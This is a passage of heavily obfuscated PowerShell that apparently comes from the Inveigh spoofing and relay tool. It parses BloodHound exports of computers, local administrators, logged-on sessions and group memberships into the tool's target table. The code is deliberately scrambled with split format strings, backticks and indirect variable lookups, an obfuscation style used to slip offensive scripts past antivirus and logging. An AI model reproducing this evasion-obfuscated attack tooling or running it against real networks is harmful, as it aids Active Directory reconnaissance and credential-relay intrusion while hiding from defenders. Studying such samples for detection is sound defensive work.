                ${stOp`wAt`cH_`p`Rog`RE`ss}.("{0}{1}" -f'R','eset').Invoke()
                ${StO`PwATCH`_Pr`OGr`E`ss}.("{0}{1}"-f 'Star','t').Invoke()
            }

            ${i}++
            ${R`Es`UlT} += , (&("{0}{2}{3}{4}{1}"-f 'I','m','nvoke-P','ars','eIte') ${_})}

        return ${Res`ULt}
    }

    function IN`VOKe`-pA`RSejSonst`RI`Ng(${j`sON}) 
    {
        ${C`onF`IG} = ${jAVas`c`R`IpTS`e`RIALizeR}.("{4}{5}{3}{0}{2}{1}"-f'liz','t','eObjec','ria','Des','e').Invoke(${J`sON})

        return &("{1}{0}{3}{4}{6}{2}{5}"-f 'voke','In','sonObj','-P','ars','ect','eJ') ${CoN`FIg}
    }

    [void] (&("{0}{1}" -f'gc','i')  ('VaR'+'Ia'+'bLe:'+'48t7')  ).vALUe::("{3}{2}{1}{0}" -f'ialName','hPart','t','LoadWi').Invoke(("{4}{1}{0}{2}{5}{3}"-f'xte','ystem.Web.E','ns','s','S','ion'))

    if(${i`NVe`igH}."En`UM`e`RAte"."cO`UnT" -eq 0)
    {
        ${e`NU`MERatE_e`mp`TY} = ${T`RUe}
    }

    if(${c`OmPU`TeRs})
    {       
        ${C`oMPu`TErS} = (&("{2}{0}{1}"-f'o','lve-Path','Res') ${C`oM`PU`Ters})."Pa`TH"
        ${ComP`U`TE`RS_Ser`IaL`IZeR} = &("{2}{0}{1}{3}" -f'ew-','Obje','N','ct') -TypeName ("{1}{2}{7}{4}{5}{0}{3}{8}{6}{9}" -f'va','Syste','m','Scri','erial','ization.Ja','tSe','.Web.Script.S','p','rializer')
        ${c`omp`U`TerS_SE`RIA`LIZeR}."maXjSON`leNG`Th" = 104857600
        ${BL`o`O`DHO`UNd_ComP`UteRs} =   (&('LS') VaRIAblE:Tb1X ).vALUE::("{2}{3}{0}{1}" -f 'llT','ext','R','eadA').Invoke(${comPu`TE`RS})
        ${b`Loo`dHouND_`coMPUTErS} = ${C`OmP`UTe`RS_sErIaL`Iz`eR}.("{2}{1}{3}{4}{0}" -f'ect','ri','Dese','ali','zeObj').Invoke(${B`Lood`hOUn`d_`CoMp`UTE`Rs})
        &("{2}{0}{1}"-f'rite-Outp','ut','W') ("{0}{4}{3}{1}{6}{2}{7}{5}" -f '[*] Parsi','dH','te','loo','ng B',' JSON','ound Compu','rs')
        ${stOP`WAtC`H`_pAR`sE} =  ( &("{0}{1}"-f'di','r') ('v'+'ArIaBLE'+':'+'1Np')).valUe::("{0}{1}{2}" -f'St','art','New').Invoke()
        ${blo`od`hOUND_`Co`Mpute`Rs} = &("{2}{0}{1}{3}" -f 'ke-Pa','r','Invo','seItem') ${BL`OoDHOU`N`D`_cOmPu`Ters}
        &("{1}{2}{3}{0}" -f'put','Writ','e-Ou','t') ("[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds ")
        ${s`TOPWatcH`_pA`R`se}.("{1}{0}" -f'et','Res').Invoke()
        ${StOp`wa`TcH_p`A`Rse}.("{0}{1}" -f 'Sta','rt').Invoke()
        &("{0}{1}{2}"-f'Wri','t','e-Output') ("{1}{4}{3}{5}{2}{0}"-f ' Inveigh','[*] Im','o','om','porting c','puters t')
        ${sto`PWATc`h_Pr`oGR`Ess} =   (&("{1}{0}" -f 'r','dI') ('vaR'+'ia'+'B'+'Le:1NP')).vaLuE::("{1}{2}{0}" -f 'tNew','S','tar').Invoke()
        ${I} = 0

        if(!${bLooD`ho`Und`_CoMPuteRs}."c`Omp`UtERs")
        {
            &("{2}{3}{0}{1}"-f'Outpu','t','Write','-') ("{1}{3}{5}{4}{6}{0}{2}" -f'arse fa','[','iled','!] ','SON computers','J',' p')
            throw
        }

        ${blOod`h`OUNd_CO`MpUte`Rs}."CoMPu`T`ERS" | &("{3}{1}{0}{2}{4}"-f'Each-O','r','bj','Fo','ect') {

            if(${st`Op`W`ATcH`_PROG`ResS}."eLAP`S`ED"."TO`T`AlmiLL`Is`eCONds" -ge 500)
            {
                ${P`ErCEnt`_c`oMplETE_cAlcu`LATI`on} =  $M3q::("{2}{0}{1}"-f 'n','cate','Tru').Invoke(${i} / ${bLO`ODH`oU`ND`_cOMPU`TeRs}."COMp`UTe`Rs"."co`UNt" * 100)

                if(${pER`CE`N`T_cOMPlE`T`e`_Ca`lcUL`ATIOn} -le 100)
                {
                    &("{4}{3}{1}{2}{0}"-f 's','e-Progr','es','rit','W') -Activity ("{2}{5}{4}{3}{1}{0}" -f'uters','comp','[*]','ng ','Importi',' ') -Status ("$percent_complete_calculation% "+'Comp'+'l'+'ete:') -PercentComplete ${p`e`RCENt`_COmPlet`e_C`AL`CULatI`oN} -ErrorAction ("{2}{0}{3}{1}" -f 'lentlyCon','inue','Si','t')
                }

                ${sT`OP`wATCH_`proGR`ESS}.("{0}{1}"-f'Re','set').Invoke()
                ${St`O`PWAtCh_pR`O`Gre`sS}.("{1}{0}"-f 'tart','S').Invoke()
            }

            ${HoSt`NA`me} = ${_}."n`AMe"
            [Array]${LoCAL_A`dMi`N`_uSErS} = ${_}."LO`cALA`d`mINs" | &("{0}{2}{1}"-f'Wh','bject','ere-O') {${_}."T`ypE" -eq ("{1}{0}"-f 'r','Use')} | &("{0}{2}{1}"-f 'Select-O','ct','bje') -expand ("{1}{0}"-f'ame','N')
            [Array]${L`o`cA`L_A`DMIN`_GROUPs} = ${_}."lOcal`A`D`mins" | &("{1}{2}{0}"-f 're-Object','Wh','e') {${_}."t`YPe" -eq ("{1}{0}" -f'oup','Gr')} | &("{1}{0}{3}{2}" -f'elect-Ob','S','ect','j') -expand ("{0}{1}" -f 'N','ame')

            if(${D`Ns})
            {
                ${I`P} = &("{0}{3}{2}{1}" -f'Get-D','ry','Ent','NS') ${hO`ST`NamE}

                if(!${i`P})
                {
                    &("{1}{2}{0}" -f 'put','W','rite-Out') ('['+'-] '+'DN'+'S '+'lookup'+' '+'fo'+'r '+"$Hostname "+'fail'+'ed')
                }

            }

            if(!${eN`U`MeRA`Te_`EmPtY})
            {

                for(${I} = 0;${i} -lt ${I`NVE`IGh}."e`NuMeR`AtE"."co`UNt";${i}++)
                {

                    if((${Hos`T`Name} -and ${I`NV`EIgH}."Enum`E`Ra`TE"[${I}]."hOSTN`AME" -eq ${H`OStna`mE}) -or (${ip} -and ${in`VeI`gh}."eNUM`Era`Te"[${I}]."i`P" -eq ${i`P}))
                    {

                        if(${i`NveIGH}."ENu`m`ERAtE"[${i}]."h`oStn`AME" -ne ${HOs`TnAmE} -and ${Inve`i`GH}."E`NUM`eraTE"[${i}]."i`p" -eq ${i`P})
                        {

                            for(${j} = 0;${j} -lt ${inve`i`gH}."EN`UMeR`Ate"."cO`UNT";${J}++)
                            {

                                if(${In`VeIgH}."EN`U`mErAtE"[${j}]."I`P" -eq ${T`ARg`Et})
                                {
                                    ${taR`G`ET`_inD`Ex} = ${J}
                                    break
                                }

                            }

                            ${i`NVEi`GH}."EnUMEr`ATe"[${t`ArgE`T_iND`eX}]."Hos`TN`AMe" = ${ho`StnA`me}
                        }
                        else
                        {

                            for(${J} = 0;${j} -lt ${i`NV`EIgh}."eN`UMerate"."coU`NT";${J}++)
                            {

                                if(${in`VeIGh}."ENu`me`RaTE"[${j}]."h`oSt`Name" -eq ${h`Ost`N`Ame})
                                {
                                    ${Tar`g`e`T`_indEX} = ${J}
                                    break
                                }

                            }

                        }

                        ${In`V`EigH}."EnUMeRa`TE"[${T`ARge`T_`I`Ndex}]."Administrator Users" = ${lO`cA`L_aD`Min_Users}
                        ${i`Nve`IgH}."enum`eR`AtE"[${tARg`eT_`InDeX}]."Administrator Groups" = ${L`OCal_`AdMin_g`RouPs}
                    }
                    else
                    {
                        ${inv`EI`Gh}."EnU`mera`Te".("{1}{0}" -f 'd','Ad').Invoke((&("{2}{0}{3}{4}{1}"-f 'Rel','numObject','New-','ay','E') -Hostname ${_}."nA`ME" -IP ${IP} -AdministratorUsers ${Loc`A`L_a`DMI`N_Us`ers} -AdministratorGroups ${locA`l_`Ad`M`IN_gROUpS})) > ${nU`ll}
                    }

                }

            }
            else
            {
                ${I`NV`eigH}."eN`UMEr`Ate".("{0}{1}"-f 'Ad','d').Invoke((&("{5}{0}{2}{4}{1}{3}"-f 'ayEnu','j','m','ect','Ob','New-Rel') -Hostname ${_}."nA`ME" -IP ${i`p} -AdministratorUsers ${Lo`CAl_adMI`N_u`Se`Rs} -AdministratorGroups ${lOCal_`AD`Mi`N_gRoUPs})) > ${n`ULL}
            }

            ${IP} = ${nu`ll}
            ${H`ostnaMe} = ${n`ULl}
            ${l`oc`Al_aD`Min_u`sE`RS} = ${N`UlL}
            ${L`oCal`_A`Dmin`_GRO`Ups} = ${nu`lL}
            ${TaR`gEt_i`N`dEX} = ${n`ULL}
            ${I}++
        }

        &("{0}{1}{2}" -f'Wr','it','e-Output') ("[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds ")
        ${sT`o`pwAtch_parSe}.("{0}{1}" -f'Res','et').Invoke()
        &("{3}{1}{4}{2}{0}"-f 'ble','ve','ria','Remo','-Va') ("{2}{3}{4}{0}{1}" -f 'd_compute','rs','bl','oodhou','n')
    }

    if(${SE`s`sIO`Ns})
    {
        ${sESSIo`Ns} = (&("{1}{2}{3}{0}" -f 'ath','Resolve','-','P') ${Se`SSioNs})."p`Ath"
        ${S`esSIO`Ns_sEr`IalizeR} = &("{0}{1}{2}"-f 'New-','O','bject') -TypeName ("{4}{5}{10}{9}{6}{0}{7}{3}{1}{8}{2}"-f'pt','ializat','Serializer','r','Syst','e','ri','.Se','ion.JavaScript','Web.Sc','m.')
        ${SeSsIonS_`s`Er`i`ALIZeR}."MaX`J`sOnleN`GTH" = 104857600
        ${bl`oodHo`Un`D_seSs`iO`Ns} =   (  &("{2}{0}{1}{3}"-f 't-chI','LDIte','Ge','m') vaRiaBlE:Tb1x  ).value::("{2}{0}{1}"-f'adAllTex','t','Re').Invoke(${s`essI`Ons})
        ${bl`OOdHoUn`d_s`e`Ssi`ONs} = ${sesSi`oN`S_Seria`L`iZeR}.("{3}{1}{4}{2}{0}{5}" -f'bje','ia','zeO','Deser','li','ct').Invoke(${b`L`OodHOuND_s`ESS`iOns})
        ${Sto`pWa`TCh_`Pa`RSE} =  ( &("{0}{1}{2}"-f 'vAr','iA','blE')  ('1n'+'P') -vAlUEONly)::("{1}{2}{0}" -f'New','Star','t').Invoke()
        &("{2}{3}{0}{1}" -f 'ut','put','Write-','O') ("{2}{7}{9}{4}{0}{10}{6}{1}{8}{5}{3}"-f'ng ','und Se','[','SON','i','sions J','o','*]','s',' Pars','BloodH')
        ${BLO`o`D`hOunD`_seSsIonS} = &("{4}{0}{3}{2}{1}"-f'oke-','tem','rseI','Pa','Inv') ${bl`o`o`DhO`Und_SEssi`ONs}
        &("{0}{2}{1}" -f'Write','tput','-Ou') ("[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds ")
        ${STO`Pwat`C`H_pA`RsE}.("{0}{1}" -f'R','eset').Invoke()
        ${s`T`op`WA`TcH_parsE}.("{1}{0}" -f 'art','St').Invoke()
        &("{0}{2}{3}{1}" -f'W','Output','r','ite-') ("{1}{5}{7}{4}{8}{9}{6}{2}{3}{0}" -f 'h','[*','i','g',' ses','] Importi',' to Inve','ng','sion','s')
        ${St`OpwA`TCH_`p`RogreSS} =  (&("{0}{1}{2}"-f 'GE','T-varI','abLe')  1Np  -Va  )::("{0}{2}{1}" -f 'Sta','New','rt').Invoke()
        ${I} = 0

        if(!${bLoO`dhO`Un`d_`sE`S`sions}."S`eSs`iOns")
        {
            &("{1}{3}{2}{0}" -f 'ut','Wri','-Outp','te') ("{3}{0}{2}{1}{4}"-f'N sess','parse','ions ','[!] JSO',' failed')
            throw
        }

        ${b`LO`odHouNd_SEs`sI`oNs}."s`EsSi`ons" | &("{2}{3}{0}{4}{1}" -f'Each','t','Fo','r','-Objec') {
            
            if(${s`T`OPWatcH_`PrOGRESS}."El`AP`Sed"."tOTal`m`i`llIs`econDS" -ge 500)
            {
                ${p`ERc`eNt_C`OM`plETe_CA`LCu`lATIOn} =   $M3q::("{0}{1}{2}"-f 'Tr','unc','ate').Invoke(${i} / ${bL`ood`HOu`Nd_se`s`SioNS}."sE`sSIo`Ns"."coU`NT" * 100)

                if(${p`ErCEnT`_com`PletE_cAL`CUl`AtiOn} -le 100)
                {
                    &("{3}{4}{2}{1}{0}" -f'ress','Prog','-','Wri','te') -Activity ("{1}{3}{0}{2}" -f ' sessio','[*] Imp','ns','orting') -Status ("$percent_complete_calculation% "+'C'+'omple'+'te'+':') -PercentComplete ${PERceN`T`_`ComPL`Ete_CaLcUlAT`Ion} -ErrorAction ("{2}{0}{3}{1}"-f'Cont','nue','Silently','i')
                }

                ${s`To`PWATcH_p`RoGre`sS}.("{1}{0}" -f'et','Res').Invoke()
                ${S`TOP`watcH`_pro`GReSS}.("{1}{0}" -f'rt','Sta').Invoke()
            }

            ${h`OStNAME} = ${_}."cOMpu`T`erNamE"

            if(${ho`S`T`NaME} -as [IPAddress] -as [Bool])
            {
                ${IP} = ${hos`TNamE}
                ${H`O`stnAmE} = ${Nu`ll}

                for(${i} = 0;${i} -lt ${InV`e`igh}."EnuM`e`RATE"."c`OunT";${i}++)
                {

                    if(${iNve`i`GH}."E`NUm`ERaTE"[${i}]."I`P" -eq ${t`A`RGeT})
                    {
                        ${tAr`Get`_InDEX} = ${I}
                        break
                    }

                }

            }
            else
            {
                for(${I} = 0;${I} -lt ${inV`Ei`gh}."EnuMeRA`Te"."Co`UnT";${I}++)
                {

                    if(${I`NvEI`gh}."eN`U`MErate"[${I}]."HOstN`A`mE" -eq ${hO`S`TName})
                    {
                        ${tA`RG`e`T_INd`eX} = ${i}
                        break
                    }

                }

                if(${D`Ns})
                {
                    ${IP} = &("{0}{1}{2}" -f 'Ge','t-DNSEnt','ry') ${h`OSt`Name}

                    if(!${i`P})
                    {
                        &("{2}{0}{3}{1}" -f 't','tput','Wri','e-Ou') ('[-]'+' '+'DNS'+' '+'lo'+'oku'+'p '+'for'+' '+"$Hostname "+'fail'+'e'+'d '+'o'+'r '+'IPv'+'6 '+'ad'+'dr'+'ess')
                    }

                }

            }

            if(!${ENU`M`erAte_`E`mPtY} -or ${Tar`gE`T_I`NdEX} -ge 0)
            {
                [Array]${SESsiOn`_`liSt} = ${INvE`IGh}."eN`UMERa`TE"[${tAr`g`E`T_InDeX}]."SESSi`o`Ns"

                if(${sEsSiOn_`l`ist} -notcontains ${_}."Us`ern`AmE")
                {
                    ${s`esSi`On_li`sT} += ${_}."u`seRnAme"
                    ${In`VE`IGh}."ENUMER`A`Te"[${TAR`get_I`NdeX}]."SE`S`SioNs" = ${Sess`io`N_List}
                }

            }
            else
            {   
                ${i`NvEi`gh}."EnUMe`Rate".("{1}{0}" -f'dd','A').Invoke($(&("{3}{1}{0}{2}{4}{5}"-f'ela','w-R','yEnumO','Ne','b','ject') -Hostname ${ho`STNa`ME} -IP ${ip} -Sessions ${_}."usERna`mE")) > ${n`UlL}
            }

            ${hOS`TN`AmE} = ${nu`lL}
            ${IP} = ${n`ULL}
            ${sESs`ION`_`lIsT} = ${nU`LL}
            ${TARGeT_`I`NdeX} = ${NU`ll}
            ${i}++
        }

        &("{1}{3}{0}{2}"-f'e-','Wri','Output','t') ("[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds ")
        ${StO`Pwa`TC`H_`PaRsE}.("{1}{0}" -f'et','Res').Invoke()
        &("{1}{2}{0}" -f'le','Remove','-Variab') ("{1}{3}{0}{2}"-f'nd_session','bloodh','s','ou')
    }
    
    if(${grOU`Ps})
    {
        ${Gr`oupS} = (&("{2}{0}{1}{3}"-f'ol','v','Res','e-Path') ${g`ROU`ps})."PA`TH"
        ${GR`OupS`_`sEr`IalI`ZEr} = &("{0}{2}{1}{3}"-f'Ne','Ob','w-','ject') -TypeName ("{1}{10}{4}{13}{12}{15}{9}{7}{0}{5}{2}{3}{6}{14}{8}{11}" -f'lizati','Sy','n.Ja','va','.W','o','Script','a','ize','ipt.Seri','stem','r','S','eb.','Serial','cr')
        ${g`ROUPS_`seriAL`i`ZER}."MAXJ`sONl`E`Ngth" = 104857600
        ${bl`o`O`d`hoUnD_gr`OupS} =   (  &("{0}{1}"-f 'D','ir') ("V"+"A"+"riablE:Tb"+"1x")).Value::("{2}{1}{3}{0}" -f'xt','adA','Re','llTe').Invoke(${g`Ro`Ups})
        ${b`loOD`Houn`d_g`R`OUPs} = ${gROuPs_sE`RI`Al`IZeR}.("{3}{0}{1}{2}"-f 'seri','alizeO','bject','De').Invoke(${bloOdhO`UNd_G`R`O`UPS})
        ${STo`PwaTch_`PA`Rse} =  (  &("{0}{2}{1}" -f 'gET','riAbLe','-va') 1nP).vaLue::("{1}{0}{2}" -f'artN','St','ew').Invoke()
        &("{0}{1}{2}" -f'Writ','e-','Output') ("{4}{0}{6}{5}{3}{2}{1}" -f 'g',' JSON',' Groups','und','[*] Parsin','Ho',' Blood')
        ${BloODHOuN`D_G`RO`UPS} = &("{2}{3}{1}{0}"-f'seItem','Par','In','voke-') ${Bl`O`odhouND_`gRoUps}
        &("{1}{0}{2}{3}"-f'rit','W','e-O','utput') ("[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds ")
        ${StOPWAtcH_`pA`R`se}.("{0}{1}" -f'R','eset').Invoke()
        ${s`TO`PwA`TCh_pARsE}.("{0}{1}" -f 'S','tart').Invoke()
        &("{3}{0}{1}{2}" -f 't','p','ut','Write-Ou') ("{6}{0}{3}{1}{2}{4}{7}{5}{8}" -f' Im','r','t','po','ing ','to Inveig','[*]','groups ','h')
        ${St`oP`Wa`T`CH_p`RO`GRess} =   (&("{1}{0}{2}" -f'Ia','VAr','BlE')  ('1'+'np') -valUEO  )::("{2}{0}{1}" -f'r','tNew','Sta').Invoke()
        ${I} = 0

        if(!${Bl`OODH`OUND_grO`U`ps}."G`ROUPS")
        {
            &("{2}{1}{0}" -f 'e-Output','it','Wr') ("{4}{1}{2}{3}{8}{6}{5}{7}{0}" -f'd','!]',' J','SON ','[',' fa','arse','ile','groups p')
            throw
        }
        
        ${B`LOOdH`OuNd`_gR`OUPS}."grOU`PS" | &("{4}{3}{1}{0}{2}" -f 'ch-Obj','Ea','ect','r','Fo') {

            if(${s`T`oPwa`Tch_PROG`Re`sS}."eLa`PS`ed"."t`OT`A`LMi`LLI`SEcoNDS" -ge 500)
            {
                ${P`eRceN`T_COM`PLEtE_`calcU`LatIon} =   (  &("{0}{1}{2}"-f 'ch','ILD','iTeM')  vArIAbLe:m3Q).vAlUE::("{1}{2}{0}" -f'ate','Tru','nc').Invoke(${I} / ${B`LoOD`hO`UnD_g`ROuPs}."gRO`U`Ps"."C`OUNT" * 100)

                if(${PE`R`CeNT_coMPlETE`_C`ALcul`AtION} -le 100)
                {
                    &("{2}{1}{3}{0}" -f 's','e-P','Writ','rogres') -Activity ("{2}{1}{0}{3}" -f' gr','porting','[*] Im','oups') -Status ("$percent_complete_calculation% "+'Comp'+'let'+'e:') -PercentComplete ${PerC`ENt_COMP`Le`T`E_caLC`Ul`AtI`on} -ErrorAction ("{1}{2}{3}{0}" -f'Continue','Sil','e','ntly')
                }

                ${sT`OpW`At`CH`_pRog`REsS}.("{0}{1}"-f 'Res','et').Invoke()
                ${SToPWaTch_`pr`oGre`ss}.("{1}{0}" -f'art','St').Invoke()
            }

            [Array]${g`Roup_mEMb`E`Rs} = ${_}."meM`BerS" | &("{4}{3}{0}{2}{1}"-f'e','t','c','elect-Obj','S') -expand ("{1}{2}{0}{3}" -f 'be','M','em','rName')
            ${I`NVei`gH}."gro`UP_T`AbLe".("{0}{1}" -f'A','dd').Invoke(${_}."n`AmE",${g`Roup_Me`MberS})
            ${Grou`P_ME`MB`ErS} = ${N`Ull}
            ${i}++
        }

        &("{0}{1}{3}{2}" -f 'Write-O','u','put','t') ("[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds ")
    }

}


